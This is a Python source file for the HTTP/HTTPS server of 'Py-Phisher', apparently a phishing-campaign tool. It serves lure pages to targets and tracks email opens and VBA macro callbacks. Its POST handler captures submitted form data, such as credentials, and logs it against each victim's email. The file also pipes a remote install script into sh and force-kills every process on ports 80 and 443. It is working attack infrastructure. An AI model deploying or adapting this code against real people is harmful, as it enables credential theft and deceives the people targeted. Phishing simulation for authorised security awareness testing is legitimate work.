#!/usr/bin/env python
#coding: utf8
# 
# Py-Phisher - A simple script for basic phishing by https://github.com/1mm0rt41PC
#
# Filename: HTTPServer.py
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; see the file COPYING. If not, write to the
# Free Software Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
#
from Conf import *;
import sys, os, ssl, re, json, signal;
import subprocess;
from Utils import parseHostname,hexProtect,urldecode,updateRow,userEmail;
from threading import Thread;
from time import strftime, time, sleep;
from glob import glob;
import cgi;
try:
	from http.server import HTTPServer, BaseHTTPRequestHandler;# Python3
except:
	from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler;# Python 2
from SocketServer import ThreadingMixIn, ForkingMixIn;


def setsid( hostname ):
	log.info('Running webserver...');
	if 'CYGWIN' not in os.environ:
		log.info('Killing all server on port %s and 443', G_HTTP_PORT);
		subprocess.Popen("netstat -lnpt | grep -E ':(80|"+str(G_HTTP_PORT)+"|443) ' | awk '{print $7}' | awk -F '/' '{print $1}' | xargs -I '{}' kill -9 '{}'", shell=True);
		if not getCert(hostname):
			log.info('Creating cert for domain '+str(hostname));
			subprocess.Popen("curl https://get.acme.sh | sh; mkdir -p /tmp/letsenccrypt; cd /tmp/letsenccrypt && python -m SimpleHTTPServer 80 & /root/.acme.sh/acme.sh --issue -d "+hostname+" -w /tmp/letsenccrypt", shell=True);
			sleep(4.0)
			log.info('Killing all server on port %s and 443', G_HTTP_PORT);
			subprocess.Popen("netstat -lnpt | grep -E ':(80|"+str(G_HTTP_PORT)+"|443) ' | awk '{print $7}' | awk -F '/' '{print $1}' | xargs -I '{}' kill -9 '{}'", shell=True);

	subprocess.Popen(("setsid python '%s'"%(os.path.realpath(__file__))).replace('.pyc','.py'), shell=True);


def main(args):
	global G_HTTP_LOG, G_HTTP_PORT;

	if 'CYGWIN' not in os.environ:
		subprocess.Popen("netstat -lnpt | grep -E ':(80|"+str(G_HTTP_PORT)+"|443) ' | awk '{print $7}' | awk -F '/' '{print $1}' | xargs -I '{}' kill -9 '{}'", shell=True);
		sleep(2.0)

	Thread(target=SSLThread).start();
	Thread(target=myCronJob).start();
	
	signal.signal(signal.SIGINT, signal_handler);

	# On drop l'accès au réseau por le user nobody
	myHandler._logger.info('255.255.255.255 - - Init IPTables');
	run(['/sbin/iptables', '-A', 'OUTPUT', '-m', 'owner', '--uid-owner', 'nobody', '-j', 'REJECT']);


	log.info('Running http server on port %d', G_HTTP_PORT);
	#httpd = HTTPServer(('', G_HTTP_PORT), myHandler);
	httpd = ThreadingHTTPServer(('', G_HTTP_PORT), myHandler);
	try:
		httpd.serve_forever();
	except KeyboardInterrupt:
		log.info('Exit');
		sys.exit(0);
	except Exception as e:
		log.critical(str(e), exc_info=e);
	return 0;


def myCronJob():
	global lastRun;
	log.info('Starting thread for CRON...');
	FNULL = open(os.devnull, 'w');
	lastRun = 0;
	while 1:
		if time() > lastRun:
			log.info('Running CRON now');
			lastRun = time()+60*10;
			for mfile in glob('/etc/cron.hourly/py-phisher_*.sh'):
				log.info('Running CRON task for: '+mfile);
				subprocess.Popen('bash '+mfile, shell=True, stdout=FNULL, stderr=FNULL);
		sleep(10);


def SSLThread():
	try:
		log.info('Running http server on port 443');
		server_ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2);
		server_ctx.set_ecdh_curve('prime256v1');
		#server_ctx.verify_mode = ssl.CERT_REQUIRED;# CERTIFICAT client
		server_ctx.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256');
		server_ctx.options |= ssl.OP_NO_COMPRESSION;
		server_ctx.options |= ssl.OP_SINGLE_ECDH_USE;
		server_ctx.options |= ssl.OP_CIPHER_SERVER_PREFERENCE;
		#server_ctx.load_cert_chain(G_KeyDir+'/server.crt', keyfile=G_KeyDir+'/server.key');
		#server_ctx.load_verify_locations(G_KeyDir+'/CA.crt');
		server_ctx.set_servername_callback(ssl_servername_callback)
		httpsd = HTTPServer(('', 443), myHandler);
		httpsd.socket = server_ctx.wrap_socket(httpsd.socket, server_side=True, do_handshake_on_connect=False);
		httpsd.serve_forever();
	except Exception as e:
		log.error('Unable to run HTTPS webserver', exc_info=e);


ssl_sni = {};
def ssl_servername_callback(sock, hostname, context):
	try:
		if not hostname:
			log.info('No hostname. DROP connection.');
			return ;
		try:
			parseHostname(hostname, strftime('%d-%b-%Y %H:%M:%S'));
		except:
			pass;
		server_ctx = ssl_sni.get(hostname)
		if server_ctx is not None:
			sock.context = server_ctx;
			return ;
		log.info('Load cert for hostname='+str(hostname));
		if not re.findall('^[A-Za-z0-9\-_\.]+$', str(hostname)):
			log.warning('Invalid hostname: '+str(hostname));
			return None;

		cert = getCert(hostname);
		if not cert:
			log.info('Not cert for hostname='+str(hostname));
			return None;
		cert, key, fullchain = cert;

		server_ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2);
		server_ctx.set_ecdh_curve('prime256v1');
		#server_ctx.verify_mode = ssl.CERT_REQUIRED;# CERTIFICAT client
		#server_ctx.load_verify_locations(G_KeyDir+'/CA.crt');
		server_ctx.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384');
		server_ctx.options |= ssl.OP_NO_COMPRESSION;
		server_ctx.options |= ssl.OP_SINGLE_ECDH_USE;
		server_ctx.options |= ssl.OP_CIPHER_SERVER_PREFERENCE;
		server_ctx.load_cert_chain(cert, keyfile=key);
		ssl_sni[hostname] = server_ctx
		sock.context = server_ctx
	except Exception as e:
		log.error(str(e), exc_info=e);


def getCert( hostname ):
	# Let's encrypt auto bot
	#cert      = '/root/.acme.sh/%s/cert.pem'%(hostname);
	#key       = '/root/.acme.sh/%s/privkey2.pem'%(hostname);
	#fullchain = '/root/.acme.sh/%s/fullchain2.pem'%(hostname);

	# acme.sh bot
	cert      = '/root/.acme.sh/%s/%s.cer'%(hostname,hostname);
	key       = '/root/.acme.sh/%s/%s.key'%(hostname,hostname);
	fullchain = '/root/.acme.sh/%s/fullchain.cer'%(hostname);

	if not os.path.exists(cert):
		log.warning('No SSL cert for hostname: '+str(hostname));
		return None;
	if not os.path.exists(key):
		log.warning('No SSL key for hostname: '+str(hostname));
		return None;
	if not os.path.exists(fullchain):
		log.warning('No SSL fullchain for hostname: '+str(hostname));
		return None;
	return (cert, key, fullchain);


class ThreadingHTTPServer(ForkingMixIn, HTTPServer):
	pass;


class myHandler(BaseHTTPRequestHandler):
	__version__ = '';
	server_version = '';
	sys_version = '';
	_content_type = {
		'.html': 'text/html;charset=UTF-8',
		'.png': 'image/png',
		'.jpg': 'image/jpg',
		'.jpeg': 'image/jpeg',
		'.svg': 'image/svg+xml',
	};

	def setPriviledge( self, uid, gid ):
		try:
			os.setgid(gid);
		except OSError as e:
			myHandler._logger.info('%-15s - - setgid %d Error %s' %(self.client_address[0]+':'+str(self.client_address[1]), gid, e));

		try:
			os.setuid(uid);
		except OSError as e:
			myHandler._logger.info('%-15s - - setuid %d Error %s' %(self.client_address[0]+':'+str(self.client_address[1]), uid, e));

		try:
			os.setegid(gid);
		except OSError as e:
			myHandler._logger.info('%-15s - - setegid %d Error %s' %(self.client_address[0]+':'+str(self.client_address[1]), gid, e));

		try:
			os.seteuid(uid);
		except OSError as e:
			myHandler._logger.info('%-15s - - seteuid %d Error %s' %(self.client_address[0]+':'+str(self.client_address[1]), uid, e));

		try:
			os.setresgid(gid, gid, -1)
		except OSError as e:
			myHandler._logger.info('%-15s - - setresgid %d Error %s' %(self.client_address[0]+':'+str(self.client_address[1]), gid, e));

		try:
			os.setresuid(uid, uid, -1)
		except OSError as e:
			myHandler._logger.info('%-15s - - setresuid %d Error %s' %(self.client_address[0]+':'+str(self.client_address[1]), uid, e));


	def __init__(self, *args):
		self.client_address = args[1];
		# Chroot
		#os.chroot(os.getcwd());
		# Drop priviledge
		self.setPriviledge(G_USER_UID, G_USER_GID);
		BaseHTTPRequestHandler.__init__(self, *args);

	def do_GET(self):
		if 'Host' not in self.headers:
			self.err404('No Host', None);
			return;

		########################################################################
		# Gestion des event vba et d'ouverture de courrier
		if self.headers['Host'].startswith('open.') or self.headers['Host'].startswith('vba.'):
			log.debug('Request analyzed by parseHostname');
			try:
				parseHostname(self.headers['Host'], strftime('%d-%b-%Y %H:%M:%S'));
			except Exception as e:
				self.err404('Error in parseHostname', e);
				return ;
			self.err404('parseHostname OK', None);
			return;

		########################################################################
		# Page après envoie du formulaire de phishing
		# http://poney.com/subscribe_done.html

		ext = '.'+self.path.split('.')[-1].lower();
		if ext in myHandler._content_type:
			log.debug('Request end with '+ext);
			myFile = urldecode(self.path).replace('\\','').split('/')[-1];
			try:
				self.decodeCookie();
				if not os.path.exists(G_Work+'/'+self.campaignId+'/www/'+myFile):
					raise Exception('');
			except Exception as e:
				self.err404('Error', e);
				return ;
			self.send_response(200);
			self.send_header('Content-type', myHandler._content_type[ext]);
			self.sendFile(G_Work+'/'+self.campaignId+'/www/'+myFile);
			return;

		########################################################################
		# Page du formulaire de phishing
		# http://poney.com/457f00A0
		try:
			self.decodeEncData(self.path);
			if os.path.exists(G_Work+'/'+self.campaignId+'/emails.db'):# Mise à jour de la BDD
				log.info('The user '+userEmail(self.campaignId,self.uid)+' get an access to index.html of the campaignId '+self.campaignId);
				updateRow(self.campaignId, self.uid, 'link', func='datetime("now","localtime")');
			if not os.path.exists(G_Work+'/'+self.campaignId+'/www/index.html'):
				log.warning('CampaignId ('+self.campaignId+') is valid. No file at '+G_Work+'/'+self.campaignId+'/www/index.html');
				raise Exception('');
		except Exception as e:
			self.err404('Error', e);
			return ;
		self.send_response(200);
		self.send_header('Content-type','text/html;charset=UTF-8');
		self.send_header('Set-Cookie', 'PYPH='+(self.path.split('/')[-1]));
		self.sendFile(G_Work+'/'+self.campaignId+'/www/index.html');

	def err404(self, reason, ex):
		self.send_response(404);
		self.send_header('Content-Length', '0');
		self.send_header('X-GO', 'hell');
		self.end_headers();
		#log.critical(reason, exc_info=ex);#############"

	def do_HEAD(self):
		#return BaseHTTPRequestHandler.do_HEAD(self);
		self.do_GET();

	def do_POST(self):
		postvars = {};
		try:
			ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'));
			if ctype == 'multipart/form-data':
				postvars = cgi.parse_multipart(self.rfile, pdict);
			elif ctype == 'application/x-www-form-urlencoded':
				length = int(self.headers.getheader('content-length'));
				postvars = cgi.parse_qs(self.rfile.read(length), keep_blank_values=1);

			self.decodeCookie();
			if not os.path.exists(G_Work+'/'+self.campaignId+'/www/index.html'):
				raise Exception('Invalid campaignId '+self.campaignId);
		except Exception as e:
			log.critical(str(e), exc_info=e);
			self.err404('Error', e);
			return ;

		updateRow( self.campaignId, self.uid, field='form', val=json.dumps(postvars));
		log.info('The user '+userEmail(self.campaignId,self.uid)+' for the campaignId '+self.campaignId+' has filled the form '+json.dumps(postvars));
		self.send_response(301);
		self.send_header('Location', self.path);
		self.send_header('Content-Length', '0');
		self.end_headers();

	def log_message(self, format, *args):
		_host = '<py-phisher:no host header>';
		try:
			_host = self.headers.get('Host', _host);
		except:
			pass;
		_ip = '?.?.?.?';
		try:
			_ip = self.client_address[0];
		except:
			pass;
		log.info('REQ - %-15s - %-15s - - %s' %(_host, _ip, format%args));
		
	def send_error(self, code, message=None):
		self.wfile.write('eW91dHUuYmUvN0xLSHBNMVVlREE=');
		return ;
	def do_OPTION(self):
		return self.err404();
	def do_OPTIONS(self):
		return self.err404();
	def do_TRACE(self):
		return self.err404();

	def decodeEncData( self, data ):
		data = urldecode(data).split('/')[-1];
		data = hexProtect.dec(data).decode('hex');
		campaignId,uid = data.split('.');
		if campaignId != 'unit-test':
			int(campaignId,10);
		int(uid,10);
		if not os.path.exists(G_Work+'/'+campaignId):
			raise Exception('Invalid campaignId '+campaignId+', no folder at '+G_Work+'/'+campaignId);
		self.campaignId = campaignId;
		self.uid = uid;

	# /!\ In case of invalid cookie or error: RAISE EXCEPTION
	# This function will provide campaignId and uid
	def decodeCookie(self):
		self.cookie = {};
		if not self.headers.get('Cookie',''):
			self.campaignId = '<py-phisher-not-found-campaignId>';
			self.uid = '<py-phisher-not-found-uid>';
			return ;
		for row in self.headers.get('Cookie','').split(';'):
			try:
				row = row.strip('\r\n\t ').split('=');
				self.cookie[row[0]]=row[1];
			except:
				log.error('Invalid cookie format: '+str(row));

		if not self.cookie['PYPH']:
			raise Exception();
		self.decodeEncData(self.cookie['PYPH']);

	def sendFile( self, mfile ):
		with open(mfile,'rb') as f:
			d = f.read();
			self.send_header('Content-Length', len(d));
			self.end_headers();
			self.wfile.write(d);

			
def run( cmd ):
	p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE);
	stdout,stderr = p.communicate();
	if stderr:
		myHandler._logger.info('255.255.255.255 - - ('+str(cmd)+') CMD-Stderr: '+stderr);
	if stdout:
		myHandler._logger.info('255.255.255.255 - - ('+str(cmd)+') CMD-Stdout: '+stdout);


def signal_handler(sig, frame):
	myHandler._logger.info('255.255.255.255 - - CTRL+C => EXIT');
	myHandler._logger.info('255.255.255.255 - - Cleaning IPTables');
	run(['/sbin/iptables', '-D', 'OUTPUT', '-m', 'owner', '--uid-owner', 'nobody', '-j', 'REJECT']);
	sys.exit(0);


if __name__ == '__main__':
	log = iniLog('http', G_HTTP_LOG);
	sys.exit(main(sys.argv));

